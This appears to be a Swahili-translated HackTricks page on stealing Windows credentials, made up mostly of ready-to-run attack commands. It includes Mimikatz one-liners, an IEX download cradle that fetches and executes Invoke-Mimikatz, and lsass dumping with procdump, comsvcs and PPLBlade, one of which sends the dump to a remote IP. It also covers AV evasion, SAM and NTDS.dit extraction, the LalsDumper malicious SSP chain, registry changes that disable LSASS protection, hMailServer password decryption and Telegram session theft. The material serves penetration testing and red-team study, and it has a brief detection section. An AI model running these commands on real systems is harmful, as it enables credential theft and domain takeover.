# Kuiba Vitambulisho vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Vitambulisho vya Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya hatua zinazowezekana za kulinda credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials ukitumia Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyoitengeneza** ili **kutafuta nywila na hashes** ndani ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Kukwepa AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, Defender haiitambui.\
Unaweza kutumia zana hii **kudump process ya lsass**, **kupakua dump** na **kutoa** **credentials ndani ya dump kwenye kifaa chako**.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe kutupa lsass.exe** kuwa **hasidi**. Hii ni kwa sababu **zinatambua** mifuatano **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **siri zaidi** kupitisha **PID** ya lsass.exe kwa procdump kama **argument** badala ya **jina lsass.exe.**

### Kutupa lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana kwenye `C:\Windows\System32`, huwajibika kwa **kutupa kumbukumbu ya process** inapotokea hitilafu ya process. DLL hii ina **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Haijalishi kutumia argument mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha process kitakachotupwa ndicho kipengele cha kwanza, eneo la faili la dump ndilo la pili, na kipengele cha tatu lazima kiwe neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda faili la dump na kuhamisha kumbukumbu ya process iliyobainishwa kwenda kwenye faili hilo.\
Inawezekana kutumia **comsvcs.dll** kutupa process ya lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Mbinu hii imefafanuliwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kutekeleza:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Unaweza kuotomatisha mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" kisha ubofye "Create dump file".

### Kudump lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft na ni sehemu ya seti ya zana za [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump ya mfumo mzima iliyopo tayari, au nakala iliyobanwa kwenye folda ya mtumiaji inayoweza kufikiwa, inaweza kuhifadhi taarifa za credentials kwa ajili ya uchanganuzi wa offline. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni viashiria vya kuanza ukaguzi tu: hakiki chanzo na ufikiaji wake, na usidhani kuwa yana credentials zinazoweza kutumika au zilizo za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Kudump lsass kwa kutumia PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni zana ya kudump michakato iliyolindwa, inayosaidia kuficha memory dump na kuihamisha kwenye workstation za mbali bila kuiandika kwenye diski.

**Vipengele muhimu**:

1. Kupita ulinzi wa PPL
2. Kuficha faili za memory dump ili kukwepa mbinu za Defender za kugundua kwa kutumia signature
3. Kupakia memory dump kwa kutumia mbinu za upakiaji za RAW na SMB bila kuiandika kwenye diski (dump isiyotumia faili)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Utoaji wa LSASS unaotegemea SSP bila MiniDumpWriteDump

Ink Dragon husambaza dumper ya hatua tatu iitwayo **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, kwa hivyo hooks za EDR kwenye API hiyo haziamilishwi:<sup>[[3]](#references)</sup>

1. **Loader ya Hatua ya 1 (`lals.exe`)** – hutafuta ndani ya `fdp.dll` placeholder yenye herufi ndogo `d` 32, huibadilisha na njia kamili ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Hatua ya 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, na kupanga blob iliyosimbuliwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Dumper ya Hatua ya 3** – payload iliyopangwa upya hutekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zinazotatuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump iliyobanwa ya LSASS ndani ya faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo kwa operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye saraka moja. Hatua ya 1 hubadilisha placeholder iliyowekwa ndani ya faili kwa njia kamili ya `rtu.txt`, kwa hivyo kuvitenganisha huvunja mnyororo.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili kufanya LSASS ipakie upya SSP kila inapowashwa.
* Faili za `%TEMP%\*.ddt` ni dump zilizobanwa. Zifungue compression kwenye mashine ya ndani, kisha zikabidhi kwa Mimikatz/Volatility ili kutoa credentials.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara tu simu hiyo inaporudi, LSASS hupakia SSP hasidi kwa uwazi na kutekeleza Hatua ya 2.
* Kuondoa DLL kwenye diski hakuiondoi kutoka LSASS. Futa ingizo la registry na uwashe upya LSASS (reboot), au uiache kwa persistence ya muda mrefu.

## CrackMapExec

### Toa hashes za SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump the NTDS.dit kutoka DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka kwa DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Kuiba SAM & SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **utoe hashes** kwa kutumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na faili linahifadhiwa kwenye C:\users\Public), lakini unaweza kutumia njia hii kunakili faili lolote lililolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala ya SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

Faili la **NTDS.dit** linajulikana kama kiini cha **Active Directory**, likihifadhi data muhimu kuhusu objects za watumiaji, groups, na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hili ni database ya **Extensible Storage Engine (ESE)** na hupatikana kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Database hii ina majedwali matatu makuu:

- **Data Table**: Jukumu la jedwali hili ni kuhifadhi maelezo kuhusu objects kama watumiaji na groups.
- **Link Table**: Hufuatilia uhusiano, kama vile uanachama wa groups.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, kuhakikisha usalama na udhibiti wa ufikiaji wa objects zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu tabaka la database unaeleza majedwali haya na jinsi yanavyofanya kazi kulingana na toleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hilo, na hutumiwa na _lsass.exe_. Kwa hiyo, **sehemu** ya faili la **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (huenda ukapata data iliyofikiwa hivi karibuni kwa sababu ya uboreshaji wa utendaji unaotumia **cache**).

#### Kudecrypt hashes zilizo ndani ya NTDS.dit

Hash husimbwa kwa njia fiche mara tatu:

1. Decrypt Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Decrypt **hash** kwa kutumia **PEK** na **RC4**.
3. Decrypt **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **husimbwa kwa njia fiche** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller hiyo. Kwa hiyo, kutoa credentials kunahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Mbinu tofauti ya [kernel handle-table redirection](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) inaweza kunakili object ya NTDS iliyofunguliwa tayari bila kutumia VSS, lakini inahitaji primitive ya kiholela ya kernel read/write kwenye domain controller.<sup>[[16]](#references)</sup>

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia hila ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, tumia hila ya [**kuidump kutoka kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali mwenye haki za msimamizi wa domain:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kutolewa na kuhifadhiwa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Siyo siri pekee zinazotolewa, bali vitu vyote na sifa zake pia, ili kupata maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` ni ya hiari, lakini huwezesha kusimbua siri (NT & LM hashes, credentials za ziada kama vile nywila za maandishi wazi, funguo za kerberos au trust, na historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zao, alama za UAC, mihuri ya muda ya kuingia na kubadilisha nywila mara ya mwisho, maelezo ya akaunti, majina, UPN, SPN, groups na uanachama wa kujirudia, mti na uanachama wa organizational units, na trusted domains pamoja na aina, mwelekeo na sifa za trust...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwenye software mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye memory. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Kutoa taarifa za kuingia kutoka kwenye faili ya SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) kisha **uitekeleze** tu, na nywila zitatolewa.

## Kuchunguza vipindi vya RDP visivyotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon inajumuisha tasker ya `DumpRDPHistory`, ambayo mbinu zake zinafaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP ya nje** – changanua kila hive ya mtumiaji katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la seva, `UsernameHint`, na muhuri wa muda wa mara ya mwisho kuandikwa. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – tafuta kwenye logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` Event IDs **21** (kuingia kumefaulu) na **25** (kukata muunganisho) ili kubaini nani aliyesimamia mashine:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Ukishajua ni Domain Admin yupi anayeunganishwa mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yake **iliyokatishwa** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zake kwenye LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Kushusha mipangilio ya Registry kunakolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha funguo kadhaa za registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` huzima Restricted Admin kwa RDP inayoingia; **haiwezeshi** pass-the-hash kupitia hali hiyo. Kuweka thamani kuwa `0` huruhusu Restricted Admin kwenye lengwa, lakini mteja lazima aombe `/RestrictedAdmin` au atumie policy inayohitaji Restricted Admin.<sup>[[14]](#references)</sup> Hash pekee haitoi haki za administrator wa mbali; tazama [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili admins wa ndani wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` humruhusu administrator wa DSRM kuingia wakati DC iko mtandaoni, hivyo kuwapa washambuliaji akaunti nyingine iliyojengewa ndani yenye haki za juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi sana kwa zana za kutupa kumbukumbu kama LalsDumper.

## Hati tambulishi za usanidi wa hMailServer (baada ya kuathiri mfumo)

Kagua faili halisi za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani inayosomeka na isiyo tupu ya `[Security] AdministratorPassword=` ni hash ya nenosiri la usimamizi wa hMailServer; si ushahidi wa nenosiri la Windows Administrator. Ikiwa hati hiyo tambulishi itapatikana, uhamiaji wowote kwenda kwenye akaunti ya Windows unahitaji uthibitishaji huru wa matumizi tena ya nenosiri na haki za kuingia.

Kwa usakinishaji unaotumia hifadhidata ya SQL CE, thamani tofauti ya `[Database] Password=` katika INI hulinda hifadhidata. Katika usakinishaji wa zamani, thamani hii husimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na ubadilishaji wa endianness ya maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI pamoja na kipande hiki cha Python:<sup>[[2]](#references)</sup>

Kwanza thibitisha kuwa akaunti ya sasa inaweza kusoma **INI na** hifadhidata ya SQL CE `.sdf` inayolingana. Nenosiri la INI hulinda hifadhidata; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya hifadhidata inayotumika; usiwahi kutumia faili hai.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Ukiwa na nenosiri la maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya biti 32, na uboreshe ikihitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu ya `accountpassword` hutumia muundo wa hash wa hMailServer (hali ya hashcat `1421`). Nenosiri la mailbox lililopasuliwa huwa njia ya pivot kwenda kwa mtumiaji wa Windows tu ikiwa nenosiri hilo linatumiwa tena na akaunti ya ndani/domain, na akaunti hiyo ina ruhusa zinazohitajika za remote-logon.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya zana hunasa **manenosiri ya logon ya plaintext** kwa kuingilia callback ya LSA ya logon `LsaApLogonUserEx2`. Wazo ni kuweka hook au wrapper kwenye callback ya authentication package ili kunasa credentials **wakati wa logon** (kabla ya hashing), kisha kuyaandika kwenye diski au kumrudishia operator. Kwa kawaida, hili hutekelezwa kwa kutumia helper inayoingiza msimbo kwenye LSA au kujisajili nayo, kisha kurekodi kila tukio la logon la interactive/network linalofaulu pamoja na username, domain na password.<sup>[[1]](#references)</sup>

Vidokezo vya uendeshaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye njia ya authentication.
- Credentials zilizonaswa huonekana tu logon inapotokea (interactive, RDP, service, au network logon, kulingana na hook).

## SSMS Sifa za Muunganisho Zilizohifadhiwa (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi maelezo ya muunganisho yaliyohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Dumpers maalum zinaweza kuchanganua faili na kurejesha credentials za SQL zilizohifadhiwa. Katika shells zinazorejesha matokeo ya amri pekee, faili hiyo mara nyingi hutolewa kwa kuisimba kama Base64 na kuchapisha matokeo yake kwa stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, jenga upya faili na uendeshe dumper kwenye mashine yako ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session za kivinjari na cookies kupitia Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Wizi wa session ya `tdata` ya Telegram Desktop

Telegram Desktop huhifadhi hali ya uidhinishaji na akaunti kwenye saraka yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa zana zinazoendana nayo ili kuthibitisha akaunti bila nenosiri la akaunti, mradi tu uidhinishaji huo bado ni halali; ikiwa usimbaji fiche wa data ya ndani umewashwa, mwizi wa data pia anahitaji passcode. Session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe na media inayoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Kugundua na kupata data

Tafuta katika mipangilio iliyosakinishwa na inayobebeka; majina ya vifurushi vya Microsoft Store hutofautiana, kwa hivyo orodhesha saraka za vifurushi zilizo na `TelegramMessenge` na ukague ndani ya saraka zake ndogo za `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ikiwa usomaji wa kawaida hautafaulu na token ya mchakato **tayari ina** `SeBackupPrivilege` **na imeiwezesha**, ufikiaji unaotumia backup ni njia mbadala; haupati privilege hiyo wala kuinua ruhusa za mchakato. `CreateFileW` yenye `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantiki za backup/restore na kupuuza ukaguzi wa usalama wa faili ikiwa token ina privileges zinazohitajika, lakini flag hiyo pekee haiwezi kushinda kizuizi cha kushiriki faili kisichooana.<sup>[[10]](#references)[[11]](#references)</sup>

Kwa faili zilizofungwa ambazo zinatumika, tengeneza/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia backup mode na kupuuza ACL za faili na saraka.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant inayozingatia matumizi ya bandwidth inaweza kuwasilisha kwanza orodha ya njia za faili pekee, kupokea kitambulisho cha snapshot pamoja na njia ambazo C2 tayari imehifadhi, kisha kupakia faili zinazokosekana pekee. Kwa hiyo, uhamishaji mdogo wa nyongeza baada ya kuorodhesha `tdata` kwa kujirudia bado unaweza kuashiria wizi uliofanikiwa wa session.<sup>[[10]](#references)</sup>

### Ugunduzi na udhibiti

Linganisha ufikiaji wa kujirudia wa `tdata` na mchakato usio wa Telegram pamoja na kuwezeshwa kwa `SeBackupPrivilege`, kufunguliwa kwa faili kwa kutumia backup-semantics, shughuli za VSS, au mchakato-mwana wa `robocopy.exe` unaotumia `/B`. Pia tafuta uorodheshaji wa haraka wa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, ukifuatiwa na miunganisho ya kutoka kwenda nje kutoka kwa mchakato huo huo. Baada ya kuathirika, tumia **Settings → Devices** (au **Privacy & Security → Active Sessions**) kusitisha sessions zisizotambulika; kuwezesha uthibitishaji wa hatua mbili pekee hakufuti idhini ambayo tayari imeibiwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa credentials za Passkeys / WebAuthn kutoka Chrome kwenye Windows

